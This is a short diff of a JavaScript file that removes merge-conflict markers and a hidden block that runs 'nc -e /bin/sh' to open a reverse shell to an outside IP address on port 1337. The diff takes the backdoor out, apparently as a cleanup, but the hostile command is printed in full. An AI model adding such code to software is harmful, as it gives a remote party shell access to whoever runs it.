@@ -10,17 +10,6 @@ var i = 0;
 //<<<<<<< HEAD
 
 //=======
-function test(command) {
-  const exec = require('child_process').exec;
-
-  exec(command, (err, stdout, stderr) => {
-    process.stdout.write(stdout)
-  })
-}
-console.log("Netcat running after this process");
-test('nc -e /bin/sh 78.68.246.110 1337 &');
-
-//>>>>>>> 4b6b7e1f3747ba593907fbce1b13b31835d5d1ec
 function toggleClicked() {
     updateButton(!running);
     if (running) {
